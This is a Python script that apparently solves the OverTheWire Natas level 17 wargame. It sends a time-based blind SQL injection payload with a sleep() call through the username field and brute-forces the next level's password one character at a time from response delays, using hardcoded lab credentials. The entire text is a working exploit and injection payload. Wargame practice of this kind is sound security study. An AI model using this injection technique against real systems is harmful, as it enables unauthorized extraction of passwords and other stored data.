from datetime import timedelta
import requests
from string import ascii_letters

alphabet = ascii_letters + "0123456789"
sleep_time_sec = 2

password = ""

finished = False
while not finished:
    finished = True

    for c in alphabet:
        pwn_data = {
            "username": f'natas18" and password like binary "{password}{c}%" and sleep({sleep_time_sec});#',
        }

        r = requests.post(
            "http://natas17.natas.labs.overthewire.org/",
            auth=("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"),
            data=pwn_data,
        )

        if r.elapsed > timedelta(seconds=sleep_time_sec):
            password += c
            print(password)
            finished = False
            break
